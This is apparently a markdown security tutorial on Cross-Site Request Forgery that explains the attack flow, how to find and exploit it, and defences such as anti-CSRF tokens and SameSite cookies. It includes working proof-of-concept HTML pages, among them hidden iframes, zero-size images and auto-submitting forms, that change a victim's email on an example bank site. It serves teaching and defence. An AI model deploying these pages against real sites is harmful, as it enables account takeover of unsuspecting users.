# Cross-Site Request Forgery (CSRF)

## Table Of Contents

- [What is CSRF](#what-is-csrf)
- [How To Find CSRF Vulnerabilities](#how-to-find-csrf-vulnerabilities)
- [How to Exploit CSRF Vulnerabilities](#how-to-exploit-csrf-vulnerabilities)
- [How to Prevent CSRF Vulnerabilities](#how-to-prevent-csrf-vulnerabilities)

---

## What is CSRF?

CSRF (Cross-Site Request Forgery) is an attack where the attacker tricks an authenticated user into performing unintended actions on a web application.

---

### Session Management

#### Login Example

1. User logs in to the web application:
`POST /login.php HTTP/1.1 username=admin password=admin`
Response:
`Set-Cookie: session=66htna8ujukmhjsxutvd`

2. Session Management:
- Cookies are used to track authenticated users.
- Example session cookies:
  - `session=66htna8ujukmhjsxutvd`
  - User mapping:
    - Tom: `j898c5azapljpbkm0e7k`
    - Emily: `gqy3fizemr95hzb0n5r9`
    - Ahmed: `0tq1kk0nta3irc847uc7`

---

### CSRF Attack Flow

1. The attacker creates a malicious link:
`https://bank.com/email/change?email=attacker@gmail.com`

2. The victim unknowingly visits the malicious link.

3. The web application processes the request as legitimate:
- Action is performed under the victim's authenticated session.

---

#### Exploit Example

```html
<!DOCTYPE html>
<html>
<body>
 <iframe src="https://bank.com/email/change?email=attacker@gmail.com"></iframe>
</body>
</html>
```
### CSRF Conditions

To successfully exploit a CSRF vulnerability, the following conditions must be true:

1. #### Relevant Action
The web application performs an action that the attacker wants to exploit (e.g., updating an email address, resetting a password).

2. #### Cookie-Based Session Handling
The web application uses cookies to maintain the authenticated session of the user.

3. #### No Unpredictable Parameters
The web application lacks any mechanism, such as anti-CSRF tokens, that introduces unpredictable values into the request.

---

### Impact of CSRF Attacks

The impact of a CSRF attack depends on the functionality being exploited. Potential impacts include:

- **Confidentiality**: None, Partial (Low), or High
- **Integrity**: Partial or High
- **Availability**: None, Partial (Low), or High
- **Remote Code Execution**: May occur if the application allows it.

---

## How to Find CSRF Vulnerabilities

### Black-Box Testing Perspective

1. Map the application and review its key functionalities.
2. Identify application functions that satisfy these conditions:
   - Relevant action
   - Cookie-based session handling
   - No unpredictable request parameters
3. Create a Proof of Concept (PoC):
   - **GET Request**: Use an `<img>` tag with the `src` attribute pointing to the vulnerable URL.
   - **POST Request**: Use a form with hidden fields for all required parameters and set the target to the vulnerable URL.

```html
<html>
  <body>
    <form action="https://vulnerablewebsite.com/email/change" method="POST">
      <input type="hidden" name="email" value="pwned@eviluser.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### White-Box Testing Perspective

1. Identify the framework used by the application.
2. Check the framework's defenses against CSRF attacks.
3. Review the code to ensure built-in defenses are not disabled.
4. Verify that all sensitive functionality has CSRF defenses applied.

---

## How to Exploit CSRF Vulnerabilities

### Exploiting CSRF - GET Scenario

#### Example Request
`GET https://bank.com/email/change?email=test@test.ca HTTP/1.1`


#### Exploit Example
```html
<html>
  <body>
    <h1>Hello World!</h1>
    <img src="https://bank.com/email/change?email=attacker@gmail.ca" width="0" height="0" border="0" />
  </body>
</html>
```

#### Result

The victim unknowingly executes the malicious action.

---

### Exploiting CSRF - POST Scenario

#### Example Request

`POST /email/change HTTP/1.1 Host: https://bank.com ... email=test@test.ca`


### Exploit Example
```html
<html>
  <body>
    <h1>Hello World!</h1>
    <iframe style="display:none" name="csrf-iframe"></iframe>
    <form action="https://bank.com/email/change/" method="POST" target="csrf-iframe" id="csrf-form">
      <input type="hidden" name="email" value="test@test.ca" />
    </form>
    <script>
      document.getElementById("csrf-form").submit();
    </script>
  </body>
</html>
```

## How to Prevent CSRF Vulnerabilities
### Primary Defense: CSRF Tokens
#### Token Generation
- Tokens must be unpredictable and have high entropy.
- Tokens should be tied to the user’s session.

#### Token Transmission
- Use hidden fields in HTML forms submitted via POST.
- Custom request headers can also transmit tokens.

#### Token Validation
- Validate tokens against session data stored server-side.
- If a token is missing or invalid, reject the request.

---

### Additional Defense: SameSite Cookies

The `SameSite` attribute can control whether cookies are submitted in cross-site requests.

#### Examples
`Set-Cookie: session=test; SameSite=Strict Set-Cookie: session=test; SameSite=Lax Set-Cookie: flavor=choco; SameSite=None; Secure`


---

### Inadequate Defense: Referer Header

The `Referer` header contains the address of the page making the request.

#### Weaknesses
- Can be spoofed or omitted.
- Often only partially checked (e.g., for the domain).

---

## Resources

- [Web Security Academy - CSRF](https://portswigger.net/web-security/csrf)
- [OWASP - CSRF](https://owasp.org/www-community/attacks/csrf)
- [Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP Code Review Guide - Reviewing Code for CSRF Issues](https://owasp.org/www-project-code-review-guide/reviewing-code-for-csrf-issues)

